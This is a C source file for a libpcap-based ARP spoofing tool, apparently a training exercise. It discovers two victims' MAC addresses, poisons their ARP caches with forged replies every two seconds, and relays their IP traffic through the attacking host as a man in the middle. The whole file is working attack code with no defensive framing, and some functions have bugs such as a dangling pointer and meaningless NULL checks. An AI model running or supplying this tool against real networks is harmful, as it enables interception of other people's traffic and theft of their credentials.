#include "header.h"

pcap_t *handle;
u_int32_t localip_addr;
u_int8_t localmac_addr[6];

unsigned char *GetMACaddr(char *interface_name)
{
    struct ifreq ifr;
    int s;
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket");
        exit(1);
    }

    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("ioctl");
        exit(1);
    }
    unsigned char *hwaddr = (unsigned char *)ifr.ifr_hwaddr.sa_data;

    printf("My Hardware Address : %02X:%02X:%02X:%02X:%02X:%02X\n", hwaddr[0], hwaddr[1], hwaddr[2], hwaddr[3], hwaddr[4], hwaddr[5]);

    close(s);

    return hwaddr;
}

int Get_interface()
{
    pcap_if_t *alldevs;
    pcap_if_t *d;

    int i = 0;

    char errbuf[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&alldevs, errbuf) < 0)
    {
        printf("Pcap_findalldevs error : %s\n", errbuf);
        return -1;
    }

    if (!alldevs)
    {
        printf("%s\n", errbuf);
    }

    for (d = alldevs; d; d = d->next)
    {
        printf("%d. %s", ++i, d->name);

        if (d->description)
            printf(" (%s)", d->description);

        printf("\n");
    }

    pcap_freealldevs(alldevs);
    return 0;
}

int GetIPaddr(char *interface_name)
{
    int s;
    struct ifreq ifr;

    s = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interface_name, IFNAMSIZ - 1);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl");
        exit(1);
    }
    else
    {
        printf("%s - My IP Address :  %s\n\n", interface_name, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
        return ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
    }

    close(s);
}

int arp_spoof_attack(u_int8_t attack_mac_address[6], char *ip_1, char *ip_2)
{
    u_char packet[1000] = {
        0,
    };

    ETH_H eth_h = (ETH_H)packet;
    ARP_H arp_h = (ARP_H)(packet + 14);

    memcpy(eth_h->Dest_hardware_addr, attack_mac_address, 6);
    memcpy(eth_h->Source_hardware_addr, localmac_addr, 6);
    eth_h->type = ntohs(0x0806);

    arp_h->Hardware_type = ntohs(1);
    arp_h->Protocol_type = ntohs(0x0800);
    arp_h->Hardware_address_length = 6;
    arp_h->Protocol_address_length = 4;
    arp_h->Operation_code = ntohs(2);
    memcpy(arp_h->Source_hardware_address, localmac_addr, 6);
    arp_h->Source_protocol_address = inet_addr(ip_1);
    memcpy(arp_h->Destination_hardware_address, attack_mac_address, 6);
    arp_h->Destination_protocol_address = inet_addr(ip_2);

    if (pcap_sendpacket(handle, packet, 46))
    {
        printf("[ERROR!] Send ARP packet error\n");
        exit(-1);
    }
}

int packet_relay(pcap_pkthdr *header, const u_char *packet, const u_int8_t *sender_mac, const u_int32_t sender_ip, const u_int8_t *target_mac)
{
    if (header->len < sizeof(_eth_header) + sizeof(_ip_header))
    {
        return 0;
    }

    ETH_H eth_h = (ETH_H)packet;

    if (ntohs(eth_h->type) != 0x0800)
    {
        return 0;
    }

    if ((memcmp(eth_h->Source_hardware_addr, sender_mac, 6) != 0 && memcmp(eth_h->Source_hardware_addr, target_mac, 6) != 0) || memcmp(eth_h->Dest_hardware_addr, localmac_addr, 6) != 0)
    {
        return 0;
    }

    IP_H ip_h = (IP_H)(packet + sizeof(_eth_header));

    if (ip_h->ip_src != sender_ip && ip_h->ip_dst != sender_ip)
    {
        return 0;
    }

    static u_char new_packet[65536];

    memcpy(new_packet, packet, header->len);

    ETH_H new_packet_eth_h = (ETH_H)new_packet;

    if (memcmp(eth_h->Source_hardware_addr, sender_mac, 6) == 0)
    {
        memcpy(new_packet_eth_h->Dest_hardware_addr, target_mac, 6);
        memcpy(new_packet_eth_h->Source_hardware_addr, localmac_addr, 6);
    }
    else
    {
        memcpy(new_packet_eth_h->Dest_hardware_addr, sender_mac, 6);
        memcpy(new_packet_eth_h->Source_hardware_addr, localmac_addr, 6);
    }

    if (pcap_sendpacket(handle, new_packet, header->len) != 0)
    {
        printf("[ERROR!] send packet error : %s", pcap_geterr(handle));
        return 0;
    }
}

u_int8_t *get_victim_mac_address(u_int32_t ipaddr)
{
    u_char packet[1000] = {
        0,
    };

    ETH_H eth_h = (ETH_H)packet;

    memcpy(eth_h->Dest_hardware_addr, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(eth_h->Source_hardware_addr, localmac_addr, 6);
    eth_h->type = ntohs(0x0806);

    ARP_H arp_h = (ARP_H)(packet + 14);

    arp_h->Hardware_type = ntohs(1);
    arp_h->Protocol_type = ntohs(0x0800);
    arp_h->Hardware_address_length = 6;
    arp_h->Protocol_address_length = 4;
    arp_h->Operation_code = ntohs(1);
    memcpy(arp_h->Source_hardware_address, localmac_addr, 6);
    arp_h->Source_protocol_address = localip_addr;
    memcpy(arp_h->Destination_hardware_address, "\x00\x00\x00\x00\x00\x00", 6);
    arp_h->Destination_protocol_address = ipaddr;

    pcap_sendpacket(handle, packet, 46);

    struct pcap_pkthdr *header;
    u_int8_t *Victim_hardware_addr = new u_int8_t[6];
    const u_char *reply_packet;

    while (pcap_next_ex(handle, &header, &reply_packet) >= 0)
    {
        if (reply_packet == NULL)
        {
            continue;
        }

        ETH_H capture_eth_h = (ETH_H)reply_packet;

        if (ntohs(capture_eth_h->type) != 0x0806)
        {
            continue;
        }

        ARP_H capture_arp_h = (ARP_H)(reply_packet + 14);

        if (ntohs(capture_arp_h->Protocol_type) == 0x0800 && ntohs(capture_arp_h->Operation_code) == 2 && capture_arp_h->Source_protocol_address == arp_h->Destination_protocol_address)
        {
            memcpy(Victim_hardware_addr, capture_arp_h->Source_hardware_address, 6);
            break;
        }
    }

    return Victim_hardware_addr;
}

int main(int argc, char *argv[])
{

    u_int8_t sender_hardware_addr[6];
    u_int8_t target_hardware_addr[6];
    char error_buf[PCAP_ERRBUF_SIZE];

    u_char packet[1000] = {
        0,
    };

    if (argc != 4)
    {
        printf("-- Interface List --\n\n");
        Get_interface();
        printf("--------------------\n");
        printf("\nUsage : %s [interface] [sender_ip] [target_ip]\n\n", argv[0]);
        return 0;
    }

    handle = pcap_open_live(argv[1], 65536, 1, 1000, error_buf);

    if (!handle)
    {
        printf("[ERROR!] %s\n", error_buf);
        return -1;
    }

    memcpy(localmac_addr, GetMACaddr(argv[1]), 6);
    localip_addr = GetIPaddr(argv[1]);

    memcpy(sender_hardware_addr, get_victim_mac_address(inet_addr(argv[2])), 6);
    memcpy(target_hardware_addr, get_victim_mac_address(inet_addr(argv[3])), 6);

    if (target_hardware_addr == NULL || sender_hardware_addr == NULL)
    {
        printf("[ERROR!] is the target and sender currently exist?\n\n");
        return 1;
    }

    printf("[*] Sender MAC : %02X:%02X:%02X:%02X:%02X:%02X\n", sender_hardware_addr[0], sender_hardware_addr[1], sender_hardware_addr[2], sender_hardware_addr[3], sender_hardware_addr[4], sender_hardware_addr[5]);
    printf("[*] Target MAC : %02X:%02X:%02X:%02X:%02X:%02X\n", target_hardware_addr[0], target_hardware_addr[1], target_hardware_addr[2], target_hardware_addr[3], target_hardware_addr[4], target_hardware_addr[5]);

    // packet relay

    printf("[*] Start ARP Spoofing\n\n");

    time_t send_arp_time = 0;

    while (1)
    {

        time_t now_time = time(NULL);
        if (now_time >= send_arp_time)
        {
            printf("[*] time to send arp again~\n");
            send_arp_time = now_time + 2;
            arp_spoof_attack(sender_hardware_addr, argv[3], argv[2]);
            arp_spoof_attack(target_hardware_addr, argv[2], argv[3]);
        }

        struct pcap_pkthdr *header;
        const u_char *reply_packet;

        int response = pcap_next_ex(handle, &header, &reply_packet);

        if (response < 0)
        {
            printf("[ERROR!]\n");
            break;
        }
        else if (response == 0)
        {
            continue;
        }
        packet_relay(header, reply_packet, sender_hardware_addr, inet_addr(argv[2]), target_hardware_addr);
    }

    return 0;
}
